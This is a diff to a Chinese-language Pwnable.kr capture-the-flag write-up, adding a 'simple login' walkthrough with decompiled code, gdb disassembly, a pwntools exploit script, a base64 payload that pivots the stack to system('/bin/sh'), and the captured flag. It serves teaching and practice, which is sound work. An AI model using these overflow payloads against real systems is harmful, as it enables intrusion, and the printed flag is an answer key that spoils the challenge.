@@ -12053,7 +12053,7 @@ io.close()
 
 ### brain fuck
 
-这是**Pwnable.kr**的第二十二个挑战`brain fuck`，来自**[Rookiss]**部分。好家伙，`who-you-know`和他的魂器出现啦。
+这是**Pwnable.kr**的第二十二个挑战`brain fuck`，来自**[Rookiss]**部分。
 
 ```bash
 I made a simple brain-fuck language emulation program written in C. 
@@ -12238,6 +12238,266 @@ log.info('system_addr => %s' % hex(system_addr))
 shellcode = p32(system_addr) + p32(gets_addr) + p32(main_addr) + b'/bin/sh'
 io.sendline(shellcode)
 io.interactive()
+```
+
+------
+
+### simple login
+
+这是**Pwnable.kr**的第二十四个挑战`simple login`，来自**[Rookiss]**部分。
+
+```bash
+Can you get authentication from this server?
+
+Download : http://pwnable.kr/bin/login
+
+Running at : nc pwnable.kr 9003
+```
+
+先把二进制文件`login`下载并查看文件信息。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/login 
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ sudo chmod +x ./login  
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ file ./login                         
+./login: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=e09ec7145440153c4b3dedc3c7a8e328d9be6b55, not stripped
+                                                                                                      
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ checksec --file=./login
+[*] '/home/tyd/ctf/pwn/pwnable.kr/login'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+使用`IDA pro 32bit`打开附件`login`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [esp+4h] [ebp-3Ch]
+  int v5; // [esp+18h] [ebp-28h] BYREF
+  _BYTE v6[30]; // [esp+1Eh] [ebp-22h] BYREF
+  unsigned int v7; // [esp+3Ch] [ebp-4h]
+
+  memset(v6, 0, sizeof(v6));
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  printf("Authenticate : ", v4);
+  _isoc99_scanf("%30s", v6);
+  memset(&input, 0, 0xCu);
+  v5 = 0;
+  v7 = Base64Decode(v6, &v5);
+  if ( v7 > 0xC )
+  {
+    puts("Wrong Length");
+  }
+  else
+  {
+    memcpy(&input, v5, v7);
+    if ( auth(v7) == 1 )
+      correct();
+  }
+  return 0;
+}
+```
+
+用户输入的字符串只有不超过`12`个字节能被复制到栈中，然而查看栈结构后发现`12`个字节就足以溢出到`ebp`寄存器啦。`$ebp`寄存器是`i386`架构中用来保存基址指针的寄存器，它能在函数调用期间维护栈帧。基址指针是用于访问栈帧的关键寄存器，它指向当前函数的栈帧的基地址。回到主函数，双击`auth()`函数查看详情：
+
+```c
+_BOOL4 __cdecl auth(int a1)
+{
+  char v2[8]; // [esp+14h] [ebp-14h] BYREF
+  char *s2; // [esp+1Ch] [ebp-Ch]
+  int v4; // [esp+20h] [ebp-8h] BYREF
+
+  memcpy(&v4, &input, a1);
+  s2 = (char *)calc_md5(v2, 12);
+  printf("hash : %s\n", s2);
+  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
+}
+```
+
+注意到`input`变量是直接写在`.bss`段上的。可以看到`input` 中的字符串被复制到 `v4` ，其中 `input` 的长度最大可以达到 `12`，而 `v4` 的长度仅仅为 `8`，溢出的 `4` 个字节将会覆盖函数 `auth()` 的栈帧中保存的 `$ebp`寄存器。也就是说，我们可以通过这个栈溢出漏洞控制 `main()` 函数的 `$ebp` 寄存器的值。
+
+继续审计代码，双击`correct()`函数查看详情：
+
+```c
+void __noreturn correct()
+{
+  if ( input == -559038737 )
+  {
+    puts("Congratulation! you are good!");
+    system("/bin/sh");
+  }
+  exit(0);
+}
+```
+
+`correct()`函数中发现宝藏`system("/bin/sh");`，如果能控制`$eip` 寄存器执行该语句就能成功拿到`flag`。用`gdb`来查看汇编代码更美观直接。我们首先通过栈溢出漏洞控制函数`auth`的栈帧中保存的`$ebp` ，接着在其返回处通过`leave`（等价于`mov esp, ebp; pop ebp`）控制`main`函数中`$ebp`寄存器的值，然后在`main`函数返回处通过`leave`控制`$esp`的值，进而通过`ret`（等价于`pop eip`）控制`$eip`寄存器，最终劫持程序跳转执行`system("/bin/sh");`。此外需要注意`mov esp, ebp; pop ebp`时，`$esp`寄存器的值会减`4`，所以构造`payload`时需要用`padding`填充前`4`个字节。
+
+```assembly
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ gdb ./login
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x0804930d <+0>:     push   ebp
+   0x0804930e <+1>:     mov    ebp,esp
+   0x08049310 <+3>:     and    esp,0xfffffff0
+   0x08049313 <+6>:     sub    esp,0x40
+   0x08049316 <+9>:     mov    DWORD PTR [esp+0x8],0x1e
+   0x0804931e <+17>:    mov    DWORD PTR [esp+0x4],0x0
+   0x08049326 <+25>:    lea    eax,[esp+0x1e]
+   0x0804932a <+29>:    mov    DWORD PTR [esp],eax
+   0x0804932d <+32>:    call   0x80482e0
+   0x08049332 <+37>:    mov    eax,ds:0x811b860
+   0x08049337 <+42>:    mov    DWORD PTR [esp+0xc],0x0
+   0x0804933f <+50>:    mov    DWORD PTR [esp+0x8],0x2
+   0x08049347 <+58>:    mov    DWORD PTR [esp+0x4],0x0
+   0x0804934f <+66>:    mov    DWORD PTR [esp],eax
+   0x08049352 <+69>:    call   0x805c680 <setvbuf>
+   0x08049357 <+74>:    mov    eax,ds:0x811b864
+   0x0804935c <+79>:    mov    DWORD PTR [esp+0xc],0x0
+   0x08049364 <+87>:    mov    DWORD PTR [esp+0x8],0x1
+   0x0804936c <+95>:    mov    DWORD PTR [esp+0x4],0x0
+   0x08049374 <+103>:   mov    DWORD PTR [esp],eax
+   0x08049377 <+106>:   call   0x805c680 <setvbuf>
+   0x0804937c <+111>:   mov    DWORD PTR [esp],0x80da6a5
+   0x08049383 <+118>:   call   0x805b630 <printf>
+   0x08049388 <+123>:   lea    eax,[esp+0x1e]
+   0x0804938c <+127>:   mov    DWORD PTR [esp+0x4],eax
+   0x08049390 <+131>:   mov    DWORD PTR [esp],0x80da6b5
+   0x08049397 <+138>:   call   0x805b690 <__isoc99_scanf>
+   0x0804939c <+143>:   mov    DWORD PTR [esp+0x8],0xc
+   0x080493a4 <+151>:   mov    DWORD PTR [esp+0x4],0x0
+   0x080493ac <+159>:   mov    DWORD PTR [esp],0x811eb40
+   0x080493b3 <+166>:   call   0x80482e0
+   0x080493b8 <+171>:   mov    DWORD PTR [esp+0x18],0x0
+   0x080493c0 <+179>:   lea    eax,[esp+0x18]
+   0x080493c4 <+183>:   mov    DWORD PTR [esp+0x4],eax
+   0x080493c8 <+187>:   lea    eax,[esp+0x1e]
+   0x080493cc <+191>:   mov    DWORD PTR [esp],eax
+   0x080493cf <+194>:   call   0x8049095 <Base64Decode>
+   0x080493d4 <+199>:   mov    DWORD PTR [esp+0x3c],eax
+   0x080493d8 <+203>:   cmp    DWORD PTR [esp+0x3c],0xc
+   0x080493dd <+208>:   ja     0x8049413 <main+262>
+   0x080493df <+210>:   mov    eax,DWORD PTR [esp+0x18]
+   0x080493e3 <+214>:   mov    edx,DWORD PTR [esp+0x3c]
+   0x080493e7 <+218>:   mov    DWORD PTR [esp+0x8],edx
+   0x080493eb <+222>:   mov    DWORD PTR [esp+0x4],eax
+   0x080493ef <+226>:   mov    DWORD PTR [esp],0x811eb40
+   0x080493f6 <+233>:   call   0x8069660 <memcpy>
+   0x080493fb <+238>:   mov    eax,DWORD PTR [esp+0x3c]
+   0x080493ff <+242>:   mov    DWORD PTR [esp],eax
+   0x08049402 <+245>:   call   0x804929c <auth>
+   0x08049407 <+250>:   cmp    eax,0x1
+   0x0804940a <+253>:   jne    0x804941f <main+274>
+   0x0804940c <+255>:   call   0x804925f <correct>
+   0x08049411 <+260>:   jmp    0x804941f <main+274>
+   0x08049413 <+262>:   mov    DWORD PTR [esp],0x80da6ba
+   0x0804941a <+269>:   call   0x805c2d0 <puts>
+   0x0804941f <+274>:   mov    eax,0x0
+   0x08049424 <+279>:   leave  # 等价 mov esp, ebp; pop ebp
+   0x08049425 <+280>:   ret    # 等价 pop eip
+End of assembler dump.
+pwndbg> disassemble auth
+Dump of assembler code for function auth:
+   0x0804929c <+0>:     push   ebp
+   0x0804929d <+1>:     mov    ebp,esp
+   0x0804929f <+3>:     sub    esp,0x28
+   0x080492a2 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
+   0x080492a5 <+9>:     mov    DWORD PTR [esp+0x8],eax
+   0x080492a9 <+13>:    mov    DWORD PTR [esp+0x4],0x811eb40
+   0x080492b1 <+21>:    lea    eax,[ebp-0x14]
+   0x080492b4 <+24>:    add    eax,0xc
+   0x080492b7 <+27>:    mov    DWORD PTR [esp],eax
+   0x080492ba <+30>:    call   0x8069660 <memcpy>
+   0x080492bf <+35>:    mov    DWORD PTR [esp+0x4],0xc
+   0x080492c7 <+43>:    lea    eax,[ebp-0x14]
+   0x080492ca <+46>:    mov    DWORD PTR [esp],eax
+   0x080492cd <+49>:    call   0x8049188 <calc_md5>
+   0x080492d2 <+54>:    mov    DWORD PTR [ebp-0xc],eax
+   0x080492d5 <+57>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080492d8 <+60>:    mov    DWORD PTR [esp+0x4],eax
+   0x080492dc <+64>:    mov    DWORD PTR [esp],0x80da677
+   0x080492e3 <+71>:    call   0x805b630 <printf>
+   0x080492e8 <+76>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080492eb <+79>:    mov    DWORD PTR [esp+0x4],eax
+   0x080492ef <+83>:    mov    DWORD PTR [esp],0x80da684
+   0x080492f6 <+90>:    call   0x80482f0
+   0x080492fb <+95>:    test   eax,eax
+   0x080492fd <+97>:    jne    0x8049306 <auth+106>
+   0x080492ff <+99>:    mov    eax,0x1
+   0x08049304 <+104>:   jmp    0x804930b <auth+111>
+   0x08049306 <+106>:   mov    eax,0x0
+   0x0804930b <+111>:   leave  # 等价 mov esp, ebp; pop ebp
+   0x0804930c <+112>:   ret    # 等价 pop eip    
+End of assembler dump.
+pwndbg> disassemble correct
+Dump of assembler code for function correct:
+   0x0804925f <+0>:     push   ebp
+   0x08049260 <+1>:     mov    ebp,esp
+   0x08049262 <+3>:     sub    esp,0x28
+   0x08049265 <+6>:     mov    DWORD PTR [ebp-0xc],0x811eb40
+   0x0804926c <+13>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0804926f <+16>:    mov    eax,DWORD PTR [eax]
+   0x08049271 <+18>:    cmp    eax,0xdeadbeef
+   0x08049276 <+23>:    jne    0x8049290 <correct+49>
+   0x08049278 <+25>:    mov    DWORD PTR [esp],0x80da651   # 
+   0x0804927f <+32>:    call   0x805c2d0 <puts>
+   0x08049284 <+37>:    mov    DWORD PTR [esp],0x80da66f   # "/bin/sh" 被加载到栈上$esp寄存器指向的位置
+   0x0804928b <+44>:    call   0x805b2b0 <system>          # 系统调用system函数
+   0x08049290 <+49>:    mov    DWORD PTR [esp],0x0
+   0x08049297 <+56>:    call   0x805a6a0 <exit>
+End of assembler dump.
+```
+
+编写`Python`代码求解得到`flag`：`control EBP, control ESP, control EIP, control the world~`。
+
+```python
+from pwn import *
+
+io = remote('pwnable.kr', 9003)
+elf = ELF('./login')
+input_addr = elf.sym["input"]  # 0x811eb40
+shell_addr = elf.sym["correct"] + 37  # 0x8049284
+payload = cyclic(4) + p32(shell_addr) + p32(input_addr)
+payload = b64e(payload)  # 'YWFhYYSSBAhA6xEI'
+log.success('Authenticate: %s' % payload)
+io.sendlineafter("Authenticate : ", payload)
+io.interactive()
+```
+
+此外还可以先计算出`Authenticate`：
+
+```bash
+>>> little_hex_address = lambda addr: ''.join(format(byte, '02x') for byte in addr.to_bytes(4, 'little'))
+>>> little_hex_address(0x8049278)
+78920408
+>>> little_hex_address(0x811eb40)  # obj.input
+40eb1108
+>>> import base64
+>>> base64.b64encode(bytes.fromhex('00000000 78920408 40eb1108'))
+b'AAAAAHiSBAhA6xEI'
+```
+
+`nc`进去也能打通。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ nc pwnable.kr 9003
+Authenticate : AAAAAHiSBAhA6xEI
+hash : 820da7b196c274c4fe466911c29867cc
+Congratulation! you are good!
+cat flag
+control EBP, control ESP, control EIP, control the world~
 ```
 
 ------
